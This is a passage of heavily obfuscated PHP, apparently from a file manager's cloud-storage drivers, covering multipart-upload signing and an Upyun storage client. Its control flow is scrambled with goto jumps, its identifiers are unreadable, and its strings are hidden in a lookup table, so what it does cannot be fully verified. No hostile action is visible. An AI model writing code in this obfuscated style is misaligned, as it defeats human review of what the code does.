strtotime($a°Ê°éÃ›±[1123])), $a°Ê°éÃ›±[1090] => array(array($a°Ê°éÃ›±[1092] => $this->bucket), array($a°Ê°éÃ›±[1091] => $B”®£ˆÚ†), array($a°Ê°éÃ›±[1093], $a°Ê°éÃ›±[1094], $a°Ê°éÃ›±[33]), array($a°Ê°éÃ›±[1093], $a°Ê°éÃ›±[1124], $a°Ê°éÃ›±[33]), array($a°Ê°éÃ›±[1093], $a°Ê°éÃ›±[1125], $a°Ê°éÃ›±[33]), array($a°Ê°éÃ›±[1095] => $c°«‘„õØ½), array($a°Ê°éÃ›±[1126] => $B˜æİ—ê–‹), array($a°Ê°éÃ›±[1127] => $fÛ¨ºÎƒÖ), array($a°Ê°éÃ›±[1128] => $bôÑÇç²·ò), array($a°Ê°éÃ›±[1129] => $CŠƒ‚š—†))); goto cî»ğÔîäî; cî»ğÔîäî: $fˆÀŸËÕ´Í = base64_encode(json_encode($fœßÈŞŸù‹)); $dìŸÒÙÛ¨® = hash_hmac($a°Ê°éÃ›±[1130], $fë¢¶ãæ÷, $a°Ê°éÃ›±[1131] . $this->secret, !0); $A©Œ‚ÇÅ® = hash_hmac($a°Ê°éÃ›±[1130], $this->region, $dìŸÒÙÛ¨®, !0); goto a ÏïÖ¶É©; F½ÅÉ¾ƒªÂ: $A•Ğ¢¡Ä×¸ = $a°Ê°éÃ›±[59]; $bôÑÇç²·ò = gmdate($a°Ê°éÃ›±[1121]); $fë¢¶ãæ÷ = gmdate($a°Ê°éÃ›±[687]); goto e‰ÙùšîŒ; F™ê†ÇĞ„ó: $a°Ê°éÃ›± =& $_SERVER[Ö¹ñÒÁ²÷]; $B”®£ˆÚ† = $a°Ê°éÃ›±[181]; $fÛ¨ºÎƒÖ = $a°Ê°éÃ›±[1120]; goto F½ÅÉ¾ƒªÂ; Cµ’’ŒŒàÊ: } public function multiUploadFormData($c¦ª¢¹ë…¢, $EíùÚ¦µ…À = 3600) { $AøÉ¢‡œ¡´ =& $_SERVER[Ö¹ñÒÁ²÷]; $dËøÚêÚ¦² = gmdate($AøÉ¢‡œ¡´[1216]); $C›¿æî¹–’ = array(); $CÉ‚Ñ¨´äˆ = $this->client->getUploadId($this->bucket, $c¦ª¢¹ë…¢, $C›¿æî¹–’); if (!$CÉ‚Ñ¨´äˆ) { return !1; } return array($AøÉ¢‡œ¡´[205] => $CÉ‚Ñ¨´äˆ, $AøÉ¢‡œ¡´[165] => $this->getHost() . $AøÉ¢‡œ¡´[8] . $this->pathEncode($c¦ª¢¹ë…¢), $AøÉ¢‡œ¡´[206] => $dËøÚêÚ¦², $AøÉ¢‡œ¡´[89] => $c¦ª¢¹ë…¢); } public function multiUploadAuthData($fõÏó¬¹…ª, $fóÁñõœ†ˆ = array()) { goto AİëÑÕ’ÏÔ; e÷‰¾†é„: unset($fóÁñõœ†ˆ[$A…Ô´¡”§é[89]]); if (isset($fóÁñõœ†ˆ[$A…Ô´¡”§é[207]])) { return $this->listUploadParts($C¡Ì¾œÍÎñ, $fóÁñõœ†ˆ); } $fá¹µÊ¼×‘ = array(); goto FµœÚìøÎ; aÌ…„­æÏ: if (strpos($EùˆĞ†‰…Œ, $A…Ô´¡”§é[209]) === 0) { if (isset($fá¹µÊ¼×‘[$A…Ô´¡”§é[1218]])) { $bïŠóäéÇŒ = $fá¹µÊ¼×‘[$A…Ô´¡”§é[1218]]; } else { if (isset($AóÓ‘…šŒ­[$A…Ô´¡”§é[1218]])) { $bïŠóäéÇŒ = $AóÓ‘…šŒ­[$A…Ô´¡”§é[1218]]; } else { $bïŠóäéÇŒ = hash($A…Ô´¡”§é[1130], $A…Ô´¡”§é[33]); } } return array($A…Ô´¡”§é[216] => $AóÓ‘…šŒ­[$A…Ô´¡”§é[216]], $A…Ô´¡”§é[1218] => $bïŠóäéÇŒ, $A…Ô´¡”§é[206] => $AóÓ‘…šŒ­[$A…Ô´¡”§é[1221]]); } return $AóÓ‘…šŒ­[$A…Ô´¡”§é[216]]; goto A¤Âß˜îÄ«; FµœÚìøÎ: if (isset($fóÁñõœ†ˆ[$A…Ô´¡”§é[1217]])) { $fá¹µÊ¼×‘[$A…Ô´¡”§é[1218]] = $fóÁñõœ†ˆ[$A…Ô´¡”§é[1217]]; } $DÂõŠã‡Ì = explode($A…Ô´¡”§é[167], $this->getHost()); $eïæº»ßÚ‰ = array($A…Ô´¡”§é[1219] => $DÂõŠã‡Ì[1], $A…Ô´¡”§é[1220] => $A…Ô´¡”§é[33], $A…Ô´¡”§é[195] => $A…Ô´¡”§é[115], $A…Ô´¡”§é[1132] => $fóÁñõœ†ˆ[$A…Ô´¡”§é[77]]); goto F„’ƒ›°¸Ó; AİëÑÕ’ÏÔ: $A…Ô´¡”§é =& $_SERVER[Ö¹ñÒÁ²÷]; $EùˆĞ†‰…Œ = isset($fóÁñõœ†ˆ[$A…Ô´¡”§é[156]]) ? $fóÁñõœ†ˆ[$A…Ô´¡”§é[156]] : $A…Ô´¡”§é[33]; $C¡Ì¾œÍÎñ = $fóÁñõœ†ˆ[$A…Ô´¡”§é[89]]; goto e÷‰¾†é„; F„’ƒ›°¸Ó: $EÆ¬ßÓ›ßö = $A…Ô´¡”§é[210]; $a¹‹»‡Æ“ = $A…Ô´¡”§é[8] . $this->pathEncode($C¡Ì¾œÍÎñ) . $EùˆĞ†‰…Œ; $AóÓ‘…šŒ­ = $this->client->__getSignatureV4($fá¹µÊ¼×‘, $eïæº»ßÚ‰, $EÆ¬ßÓ›ßö, $a¹‹»‡Æ“); goto aÌ…„­æÏ; A¤Âß˜îÄ«: } public function listUploadParts($c’ù¹‡, $eõÚ‡â¼Í = array()) { goto f¢«™‘å¶é; A†˜ÇÕ: $AÙï©ÖÚø— .= $BÌîè–œï¸[1225]; $FÍ¹ßŸƒÎó = array(); $EŠ¯†‡õÏë = explode($BÌîè–œï¸[167], $this->getHost()); goto fé¶ôÀÒï; FªÑ„¥Û‘˜: $d´ÒÔå›æÌ = $this->client->__getSignatureV4($FÍ¹ßŸƒÎó, $a¢¹®‹ˆ„, $bô¶®š¡áÓ, $eî†›Ä­Œ, $AÙï©ÖÚø—); return array($BÌîè–œï¸[216] => $d´ÒÔå›æÌ[$BÌîè–œï¸[216]], $BÌîè–œï¸[206] => $d´ÒÔå›æÌ[$BÌîè–œï¸[1221]], $BÌîè–œï¸[218] => $dá¥«òëÍ, $BÌîè–œï¸[1218] => $d´ÒÔå›æÌ[$BÌîè–œï¸[1218]]); goto Cë×âØˆœ; fŸäØÄ·‘‡: if (!$dá¥«òëÍ) { return !1; } $AÙï©ÖÚø— = $BÌîè–œï¸[1222]; foreach ($dá¥«òëÍ as $b¬”£Û‘) { $AÙï©ÖÚø— .= $BÌîè–œï¸[1223] . "\74\x50\141\162\x74\x4e\165\x6d\x62\145\x72\x3e{$b¬”£Û‘[$BÌîè–œï¸[1174]]}\74\57\x50\x61\162\x74\116\165\x6d\142\145\162\x3e\xa" . "\x3c\x45\124\141\147\x3e{$b¬”£Û‘[$BÌîè–œï¸[1175]]}\x3c\x2f\105\x54\141\x67\x3e\12" . $BÌîè–œï¸[1224]; } goto A†˜ÇÕ; f¢«™‘å¶é: $BÌîè–œï¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÜ”Æ»à–Å = str_replace($BÌîè–œï¸[217], $BÌîè–œï¸[33], $eõÚ‡â¼Í[$BÌîè–œï¸[156]]); $dá¥«òëÍ = $this->client->listParts($this->bucket, $c’ù¹‡, $DÜ”Æ»à–Å); goto fŸäØÄ·‘‡; fé¶ôÀÒï: $a¢¹®‹ˆ„ = array($BÌîè–œï¸[1219] => $EŠ¯†‡õÏë[1], $BÌîè–œï¸[195] => $BÌîè–œï¸[115], $BÌîè–œï¸[1132] => strlen($AÙï©ÖÚø—)); $bô¶®š¡áÓ = $BÌîè–œï¸[208]; $eî†›Ä­Œ = $BÌîè–œï¸[8] . $this->pathEncode($c’ù¹‡) . $eõÚ‡â¼Í[$BÌîè–œï¸[156]]; goto FªÑ„¥Û‘˜; Cë×âØˆœ: } public function link($D©ƒîğ‡Ö‰, $aö¶ »ŒÄì = array()) { return parent::link($D©ƒîğ‡Ö‰, $aö¶ »ŒÄì); } public function fileOut($fÜ™ìÔÄ÷, $a˜²¢ì¯É¦ = false, $dÖØ´ˆà÷Æ = false, $C³Ë±°µ¯‰ = '') { if (strstr($this->endpoint, $_SERVER[Ö¹ñÒÁ²÷][1226])) { return parent::fileOutServer($fÜ™ìÔÄ÷, $a˜²¢ì¯É¦, $dÖØ´ˆà÷Æ, $C³Ë±°µ¯‰); } parent::fileOut($fÜ™ìÔÄ÷, $a˜²¢ì¯É¦, $dÖØ´ˆà÷Æ, $C³Ë±°µ¯‰); } public function fileOutImage($Eğ‡·ÄêØ‹, $FŸ™Œ¢Ì‰ = 250) { if (strstr($this->endpoint, $_SERVER[Ö¹ñÒÁ²÷][1226])) { return parent::fileOutImageServer($Eğ‡·ÄêØ‹, $FŸ™Œ¢Ì‰); } parent::fileOutImage($Eğ‡·ÄêØ‹, $FŸ™Œ¢Ì‰); } public function fileOutLink($fË¥Ì¹º) { $B°µ¤ Ó¬¬ =& $_SERVER[Ö¹ñÒÁ²÷]; if (substr($fË¥Ì¹º, 0, 7) == $B°µ¤ Ó¬¬[1102]) { $fË¥Ì¹º = $B°µ¤ Ó¬¬[1103] . substr($fË¥Ì¹º, 7); } header($B°µ¤ Ó¬¬[152] . $fË¥Ì¹º); die; } public function getHost() { $eÒ¾–‚˜È =& $_SERVER[Ö¹ñÒÁ²÷]; $FŸòÈØÂÅ› = str_rtrim(parent::getHost(), $eÒ¾–‚˜È[8] . $this->bucket); $FŸòÈØÂÅ› = explode($eÒ¾–‚˜È[167], $FŸòÈØÂÅ›); return $FŸòÈØÂÅ›[0] . $eÒ¾–‚˜È[167] . $this->bucket . $eÒ¾–‚˜È[91] . $FŸòÈØÂÅ›[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($FÛÜ‡ÏÕ, $BÇ®›† æÏ = 0) { parent::__construct(); $this->source = $FÛÜ‡ÏÕ; $this->sourceSize = $BÇ®›† æÏ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a¸‰ãà÷®Ğ = false) { return $this->sourceSize; } public function getContent($aÄ‘Ü«ô¾ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $d‹±é³Ãù¢ = ftell($this->source); $có¹¼ŒÙäÖ = @fread($this->source, $this->sourceSize); fseek($this->source, $d‹±é³Ãù¢); return $có¹¼ŒÙäÖ; } } public function fileSubstr($AéÂóîä×„ = false, $cñà³ó„êä = 0, $f™ç¦¥í¹Ş = 0) { if (!$f™ç¦¥í¹Ş) { $f™ç¦¥í¹Ş = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $cñà³ó„êä, $f™ç¦¥í¹Ş); } if ($this->sourceType == self::TYPE_FILE) { $B‘³‘¹Ó‹â = ftell($this->source); fseek($this->source, $B‘³‘¹Ó‹â + $cñà³ó„êä); $B–ÎøˆĞ® = @fread($this->source, $f™ç¦¥í¹Ş); fseek($this->source, $B‘³‘¹Ó‹â); return $B–ÎøˆĞ®; } } public function hashMd5($e©òÎÇĞ¦ = false) { return md5($this->getContent()); } public static function hash($e£÷­šÑÏ, $cÊ¾’ßñ² = 0) { $e¾‘ùãÍ¼¡ = new PathDriverStream($e£÷­šÑÏ, $cÊ¾’ßñ²); return $e¾‘ùãÍ¼¡->hashSimple($e£÷­šÑÏ); } public static function md5($fÎèõêÎ, $B³ë¤Ş±Øá = 0) { $còÔ…Â…êÏ = new PathDriverStream($fÎèõêÎ, $B³ë¤Ş±Øá); return $còÔ…Â…êÏ->hashMd5($fÎèõêÎ); } } goto CˆÛÀĞ½Ìµ; C©©ùÀÍ›²: register_shutdown_function($_SERVER[¡Äç²][36]); set_error_handler($_SERVER[¡Äç²][49], $Fƒ·‹Ô¢Ù); if (function_exists($_SERVER[¡Äç²][50])) { set_exception_handler($_SERVER[¡Äç²][51]); } goto BÖâ¨Ÿã”ƒ; CˆÛÀĞ½Ìµ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\x3a\x2f\x2f\x76\x30\56\141\x70\x69\56\165\160\171\x75\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e¹·æùóá) { parent::__construct(); $this->_init($e¹·æùóá); } public function _init($eµ›¯‘ ¬¸) { foreach ($eµ›¯‘ ¬¸ as $a¼âŠäÊó˜ => $DÖ³â‡„ î) { if (isset($this->{$a¼âŠäÊó˜})) { $this->{$a¼âŠäÊó˜} = $DÖ³â‡„ î; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Ö¹ñÒÁ²÷][1227], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($d·É¥ùŒ¼, $dÒë›î»” = "\x47\105\124") { $eÂÄ°Ø¡Üº =& $_SERVER[Ö¹ñÒÁ²÷]; $d¦¬çÃáù = gmdate($eÂÄ°Ø¡Üº[1191]); $F“ò‚§ºŠ† = base64_encode(hash_hmac($eÂÄ°Ø¡Üº[1228], "{$dÒë›î»”}\46{$d·É¥ùŒ¼}\46{$d¦¬çÃáù}", md5("{$this->userpass}"), !0)); $aª ®ÊŞš = array("\101\x75\x74\x68\157\x72\x69\172\141\164\x69\x6f\156\72\125\120\131\x55\x4e\40{$this->username}\x3a{$F“ò‚§ºŠ†}", "\104\141\x74\x65\x3a{$d¦¬çÃáù}"); return $aª ®ÊŞš; } public function ussRequest($AÅ­Í÷é, $C­¯ˆê«£ = "\107\x45\x54", $B¸ìß¼°İŠ = false, $Dİ²†Ì«ô = false, $F‡Ò¬æÖ¼ê = false) { goto EÄÈ¸½Ã»Õ; a›…¥¸Éàê: if (!$aİŞÒãîÁÁ) { return array($b‡ˆëÄòŸ¡[1026] => !1, $b‡ˆëÄòŸ¡[1028] => $b‡ˆëÄòŸ¡[1229]); } if (strtolower($C­¯ˆê«£) == $b‡ˆëÄòŸ¡[180] || in_array($aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[1026]], array($b‡ˆëÄòŸ¡[1087], $b‡ˆëÄòŸ¡[1230]))) { $B¸ìß¼°İŠ = $aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[1231]]; } else { $B¸ìß¼°İŠ = json_decode($aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[1028]], !0); if (!$B¸ìß¼°İŠ) { $B¸ìß¼°İŠ = $aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[1028]]; } else { if (!$aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[686]] && isset($B¸ìß¼°İŠ[$b‡ˆëÄòŸ¡[1232]])) { $B¸ìß¼°İŠ = $B¸ìß¼°İŠ[$b‡ˆëÄòŸ¡[1232]]; } } } return array($b‡ˆëÄòŸ¡[1026] => $aİŞÒãîÁÁ[$b‡ˆëÄòŸ¡[686]], $b‡ˆëÄòŸ¡[1028] => $B¸ìß¼°İŠ); goto fíµÛ™à§; EÄÈ¸½Ã»Õ: $b‡ˆëÄòŸ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÅ­Í÷é = trim($AÅ­Í÷é, $b‡ˆëÄòŸ¡[8]); $aÇø”ÙÔÈÛ = "\x2f{$this->bucket}\x2f{$AÅ­Í÷é}"; goto Då„Ô£‡…; Då„Ô£‡…: $cßÍˆ‹ƒƒ = $this->ussHeaders($aÇø”ÙÔÈÛ, $C­¯ˆê«£); if ($Dİ²†Ì«ô) { $cßÍˆ‹ƒƒ = array_merge($cßÍˆ‹ƒƒ, $Dİ²†Ì«ô); } $aİŞÒãîÁÁ = url_request($this->endpoint . $aÇø”ÙÔÈÛ, $C­¯ˆê«£, $B¸ìß¼°İŠ, $cßÍˆ‹ƒƒ, $F‡Ò¬æÖ¼ê); goto a›…¥¸Éàê; fíµÛ™à§: } public function mkfile($aâò‹™³ê, $B®¡¸¼íôÌ = '', $fáŞï†Îòí = REPEAT_RENAME) { if ($this->setContent($aâò‹™³ê, $B®¡¸¼íôÌ)) { return $this->getPathOuter($aâò‹™³ê); } return !1; } public function mkdir($AÙ·âÄ²ĞÄ, $c½³ù¹¾îÑ = REPEAT_SKIP) { $Aë£“‰ä® =& $_SERVER[Ö¹ñÒÁ²÷]; $AçùÕ•ªëÄ = trim($AÙ·âÄ²ĞÄ, $Aë£“‰ä®[8]); if ($this->_isFolder($AçùÕ•ªëÄ)) { return $this->getPathOuter($AçùÕ•ªëÄ); } $AÀ¯ª°†Ö = array($Aë£“‰ä®[1233]); $EÍ™“‚Ş§­ = $this->ussRequest($AçùÕ•ªëÄ, $Aë£“‰ä®[208], !1, $AÀ¯ª°†Ö); return $EÍ™“‚Ş§­[$Aë£“‰ä®[1026]] ? $this->getPathOuter($AçùÕ•ªëÄ) : !1; } public function copyFile($B©ïÜíœ‰, $AÓÜ¥ééï) { $e¶‚Ê÷É„ =& $_SERVER[Ö¹ñÒÁ²÷]; $EóˆŞŒ÷Œµ = array($e¶‚Ê÷É„[1234] . "\57{$this->bucket}\57{$B©ïÜíœ‰}", $e¶‚Ê÷É„[1235]); $C¸ÚÏò¿ÆŞ = $this->ussRequest($AÓÜ¥ééï, $e¶‚Ê÷É„[210], !1, $EóˆŞŒ÷Œµ); return $C¸ÚÏò¿ÆŞ[$e¶‚Ê÷É„[1026]] ? !0 : !1; } public function moveFile($FµŞ‚‹‰‘, $cİ ‰œé‹) { $féã“Ë‡ÓÂ =& $_SERVER[Ö¹ñÒÁ²÷]; $b‰½Óä¬¥† = array($féã“Ë‡ÓÂ[1236] . "\x2f{$this->bucket}\57{$FµŞ‚‹‰‘}", $féã“Ë‡ÓÂ[1235]); $Cª†‘ˆ„Ñ­ = $this->ussRequest($cİ ‰œé‹, $féã“Ë‡ÓÂ[210], !1, $b‰½Óä¬¥†); return $Cª†‘ˆ„Ñ­[$féã“Ë‡ÓÂ[1026]] ? !0 : !1; } public function delFile($aã‡ °³‰) { $E¹‡ù¡×Ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $Aà±‘±òÏ = $this->ussRequest($aã‡ °³‰, $E¹‡ù¡×Ğ[1237]); return $Aà±‘±òÏ[$E¹‡ù¡×Ğ[1026]] ? !0 : !1; } public function delFolder($Aã‘®ãŒŠ) { $F„—å÷±Ìº =& $_SERVER[Ö¹ñÒÁ²÷]; $AÛµ–¦‹Øˆ = $this->listAll($Aã‘®ãŒŠ); krsort($AÛµ–¦‹Øˆ); foreach ($AÛµ–¦‹Øˆ as $f¤˜¼ó£Îó) { $this->ussRequest($f¤˜¼ó£Îó[$F„—å÷±Ìº[75]], $F„—å÷±Ìº[1237]); } return $this->ussRequest($Aã‘®ãŒŠ, $F„—å÷±Ìº[1237]); } public function rename($C‹ß—ƒÈç, $b„âåÍõÕ£) { if ($this->isFile($C‹ß—ƒÈç)) { $b„âåÍõÕ£ = get_path_father($C‹ß—ƒÈç) . $b„âåÍõÕ£; return $this->moveFile($C‹ß—ƒÈç, $b„âåÍõÕ£); } return $this->renameObject($C‹ß—ƒÈç, $b„âåÍõÕ£); } public function fileInfo($fæ‹èò…Ë, $A¸½ğÔáìÉ = false, $c“Ù»™ø„ = array()) { $bƒŸÌìİä =& $_SERVER[Ö¹ñÒÁ²÷]; if ($A¸½ğÔáìÉ) { return array($bƒŸÌìİä[28] => $this->pathThis($fæ‹èò…Ë), $bƒŸÌìİä[75] => $this->getPathOuter($bƒŸÌìİä[8] . $fæ‹èò…Ë), $bƒŸÌìİä[29] => $bƒŸÌìİä[163], $bƒŸÌìİä[77] => isset($c“Ù»™ø„[$bƒŸÌìİä[321]]) ? $c“Ù»™ø„[$bƒŸÌìİä[321]] : 0, $bƒŸÌìİä[156] => $this->ext($fæ‹èò…Ë)); } $EĞ‚‹ùÎ‰ä = array($bƒŸÌìİä[28] => $this->pathThis($fæ‹èò…Ë), $bƒŸÌìİä[75] => $this->getPathOuter($bƒŸÌìİä[8] . $fæ‹èò…Ë), $bƒŸÌìİä[29] => $bƒŸÌìİä[163], $bƒŸÌìİä[183] => 0, $bƒŸÌìİä[106] => isset($b ÙöèÙİ[$bƒŸÌìİä[1238]]) ? $b ÙöèÙİ[$bƒŸÌìİä[1238]] : 0, $bƒŸÌìİä[77] => isset($c“Ù»™ø„[$bƒŸÌìİä[321]]) ? $c“Ù»™ø„[$bƒŸÌìİä[321]] : 0, $bƒŸÌìİä[156] => $this->ext($fæ‹èò…Ë), $bƒŸÌìİä[184] => !0, $bƒŸÌìİä[185] => !0); if (empty($c“Ù»™ø„)) { $c“Ù»™ø„ = $this->objectMeta($fæ‹èò…Ë); if (!$c“Ù»™ø„) { return $EĞ‚‹ùÎ‰ä; } $EĞ‚‹ùÎ‰ä[$bƒŸÌìİä[183]] = $c“Ù»™ø„[$bƒŸÌìİä[1239]]; $EĞ‚‹ùÎ‰ä[$bƒŸÌìİä[106]] = $c“Ù»™ø„[$bƒŸÌìİä[1240]]; $EĞ‚‹ùÎ‰ä[$bƒŸÌìİä[77]] = $c“Ù»™ø„[$bƒŸÌìİä[77]]; } return $EĞ‚‹ùÎ‰ä; } public function folderInfo($aø§ÊÓ±ÊÛ, $EÍøæ’Ÿ§¼ = false) { $f¹°ì³¤ºà =& $_SERVER[Ö¹ñÒÁ²÷]; if ($EÍøæ’Ÿ§¼) { return array($f¹°ì³¤ºà[28] => $this->pathThis($aø§ÊÓ±ÊÛ), $f¹°ì³¤ºà[75] => $this->getPathOuter($f¹°ì³¤ºà[8] . $aø§ÊÓ±ÊÛ), $f¹°ì³¤ºà[29] => $f¹°ì³¤ºà[76]); } $DãÔÌº…–­ = array($f¹°ì³¤ºà[28] => $this->pathThis($aø§ÊÓ±ÊÛ), $f¹°ì³¤ºà[75] => $this->getPathOuter($f¹°ì³¤ºà[8] . $aø§ÊÓ±ÊÛ), $f¹°ì³¤ºà[29] => $f¹°ì³¤ºà[76], $f¹°ì³¤ºà[183] => 0, $f¹°ì³¤ºà[106] => isset($D½¦¢ò¹Àğ[$f¹°ì³¤ºà[1238]]) ? $D½¦¢ò¹Àğ[$f¹°ì³¤ºà[1238]] : 0, $f¹°ì³¤ºà[1148] => !0, $f¹°ì³¤ºà[1149] => !0); if (empty($cºƒÇçö‘»)) { $cºƒÇçö‘» = $this->objectMeta($aø§ÊÓ±ÊÛ); if (!$cºƒÇçö‘») { return $DãÔÌº…–­; } $DãÔÌº…–­[$f¹°ì³¤ºà[183]] = $cºƒÇçö‘»[$f¹°ì³¤ºà[1239]]; $DãÔÌº…–­[$f¹°ì³¤ºà[106]] = $cºƒÇçö‘»[$f¹°ì³¤ºà[1240]]; } return $DãÔÌº…–­; } private function fileList($Cğ³ô‹ ªö, $báÓ¢Á• = 0, $E³ÎÑ¥ŠÛ = 1000) { $d¦‹¥ß¢£ =& $_SERVER[Ö¹ñÒÁ²÷]; $A™ØŸÑ·Ñ = array($d¦‹¥ß¢£[1241], $d¦‹¥ß¢£[1242] . $E³ÎÑ¥ŠÛ); if ($báÓ¢Á•) { $A™ØŸÑ·Ñ[] = $d¦‹¥ß¢£[1243] . $báÓ¢Á•; } $EÙÃ‘Èæ™ = $this->ussRequest($Cğ³ô‹ ªö, $d¦‹¥ß¢£[212], !1, $A™ØŸÑ·Ñ); return !$EÙÃ‘Èæ™[$d¦‹¥ß¢£[1026]] ? !1 : $EÙÃ‘Èæ™[$d¦‹¥ß¢£[1028]]; } public function listPath($BÌÈºÆá…•, $BÒŒƒˆÓƒç = false) { goto Aæ¼ÌâÌëË; C‡öí¼á²±: $a›¶ÙÀÅ– = $E¾Š‹³©Ï = array(); $E©¬Üë£ÀÂ = rtrim($BÌÈºÆá…•, $EçœğêÅ[8]) . $EçœğêÅ[8]; while (!0) { $bùîË’ŒŞ‘ = $this->fileList($BÌÈºÆá…•, $eÕÑíŒ›§, $DÙ££ØÒôê); if (!$bùîË’ŒŞ‘) { return !1; } $eÕÑíŒ›§ = isset($bùîË’ŒŞ‘[$EçœğêÅ[1244]]) ? $bùîË’ŒŞ‘[$EçœğêÅ[1244]] : $EçœğêÅ[33]; $b¦¬³¹óøƒ = isset($bùîË’ŒŞ‘[$EçœğêÅ[1245]]) ? $bùîË’ŒŞ‘[$EçœğêÅ[1245]] : array(); foreach ($b¦¬³¹óøƒ as $fÕ®ø«‡²Ü) { if ($fÕ®ø«‡²Ü[$EçœğêÅ[29]] == $EçœğêÅ[76]) { $a›¶ÙÀÅ–[] = $this->folderInfo($E©¬Üë£ÀÂ . $fÕ®ø«‡²Ü[$EçœğêÅ[28]], $BÒŒƒˆÓƒç, $fÕ®ø«‡²Ü); } else { $E¾Š‹³©Ï[] = $this->fileInfo($E©¬Üë£ÀÂ . $fÕ®ø«‡²Ü[$EçœğêÅ[28]], $BÒŒƒˆÓƒç, $fÕ®ø«‡²Ü); } } if (count($b¦¬³¹óøƒ) < $DÙ££ØÒôê) { break; } } goto bê±ºÑÛ¼¬; bê±ºÑÛ¼¬: return array($EçœğêÅ[74] => $a›¶ÙÀÅ–, $EçœğêÅ[73] => $E¾Š‹³©Ï); goto Bá•¡°ƒÉš; Aæ¼ÌâÌëË: $EçœğêÅ =& $_SERVER[Ö¹ñÒÁ²÷]; $eÕÑíŒ›§ = $EçœğêÅ[33]; $DÙ££ØÒôê = 1000; goto C‡öí¼á²±; Bá•¡°ƒÉš: } private function recursionAllFiles($Aé†Ôƒï»İ, &$AÂ•ÇÌ¦¬«) { $e¬ãÕ‹»¹· =& $_SERVER[Ö¹ñÒÁ²÷]; $FÚ¾¢«áØ¢ = $e¬ãÕ‹»¹·[33]; $B‰ÈËƒ¹’ = 1000; $AåæšˆŠÈ = $dçÖöä‡®› = array(); $E¯Çù£¤ò‚ = rtrim($Aé†Ôƒï»İ, $e¬ãÕ‹»¹·[8]) . $e¬ãÕ‹»¹·[8]; while (!0) { $A‚ÉªÑš½ = $this->fileList($Aé†Ôƒï»İ, $FÚ¾¢«áØ¢, $B‰ÈËƒ¹’); if (!$A‚ÉªÑš½) { return !1; } $FÚ¾¢«áØ¢ = isset($A‚ÉªÑš½[$e¬ãÕ‹»¹·[1244]]) ? $A‚ÉªÑš½[$e¬ãÕ‹»¹·[1244]] : $e¬ãÕ‹»¹·[33]; $c§¨·é©Úà = isset($A‚ÉªÑš½[$e¬ãÕ‹»¹·[1245]]) ? $A‚ÉªÑš½[$e¬ãÕ‹»¹·[1245]] : array(); foreach ($c§¨·é©Úà as $FÏŞÓÉ—±) { $e‚›±›õ‰¯ = array($e¬ãÕ‹»¹·[75] => $E¯Çù£¤ò‚ . $FÏŞÓÉ—±[$e¬ãÕ‹»¹·[28]], $e¬ãÕ‹»¹·[76] => $FÏŞÓÉ—±[$e¬ãÕ‹»¹·[29]] == $e¬ãÕ‹»¹·[76] ? 1 : 0, $e¬ãÕ‹»¹·[77] => isset($FÏŞÓÉ—±[$e¬ãÕ‹»¹·[321]]) ? $FÏŞÓÉ—±[$e¬ãÕ‹»¹·[321]] : 0); $AÂ•ÇÌ¦¬«[] = $e‚›±›õ‰¯; if ($e‚›±›õ‰¯[$e¬ãÕ‹»¹·[76]] == 1) { $this->recursionAllFiles($e‚›±›õ‰¯[$e¬ãÕ‹»¹·[75]], $AÂ•ÇÌ¦¬«); } } if (count($c§¨·é©Úà) < $B‰ÈËƒ¹’) { break; } } } public function has($aõ›šõ²çº, $DÒÊ¨İõô‚ = false, $AŒ®í“´×¤ = true) { goto a²œ¯ˆÀ°; bš¤ˆ‘ï: while (!0) { $aŠäèÚ…‚È = $this->fileList($aõ›šõ²çº, $A®‰‘„¼çÆ, $C¹Œ‚áµ); if (!$aŠäèÚ…‚È) { return !1; } $A®‰‘„¼çÆ = isset($aŠäèÚ…‚È[$f‚Ñ´‚Á¥õ[1244]]) ? $aŠäèÚ…‚È[$f‚Ñ´‚Á¥õ[1244]] : $f‚Ñ´‚Á¥õ[33]; $A¬ÛŠÕÄ—à = isset($aŠäèÚ…‚È[$f‚Ñ´‚Á¥õ[1245]]) ? $aŠäèÚ…‚È[$f‚Ñ´‚Á¥õ[1245]] : array(); if (empty($A¬ÛŠÕÄ—à)) { break; } $dï˜ğ‘¿ää = array_to_keyvalue($A¬ÛŠÕÄ—à, $f‚Ñ´‚Á¥õ[33], $f‚Ñ´‚Á¥õ[29]); $dØ¶ìÍÁ Ñ = array_count_values($dï˜ğ‘¿ää); $Aò‘¦öæò = isset($dØ¶ìÍÁ Ñ[$f‚Ñ´‚Á¥õ[76]]) ? $dØ¶ìÍÁ Ñ[$f‚Ñ´‚Á¥õ[76]] : 0; $eÉ‚éŠ×éÎ = count($dï˜ğ‘¿ää) - $Aò‘¦öæò; if ($DÒÊ¨İõô‚) { $FŸœà–ƒ™ += $Aò‘¦öæò; $eªà…ù£Ä› += $eÉ‚éŠ×éÎ; if ($Dªô‡„Ï·£ < $C¹Œ‚áµ) { break; } continue; } if ($AŒ®í“´×¤) { if ($eÉ‚éŠ×éÎ) { return !0; } } else { if ($Aò‘¦öæò) { return !0; } } if (count($A¬ÛŠÕÄ—à) < $C¹Œ‚áµ) { break; } } if ($DÒÊ¨İõô‚) { return array($f‚Ñ´‚Á¥õ[187] => $eªà…ù£Ä›, $f‚Ñ´‚Á¥õ[188] => $FŸœà–ƒ™); } return !1; goto c ã¬–áÏ; c‚¤—õ°…‹: $eªà…ù£Ä› = 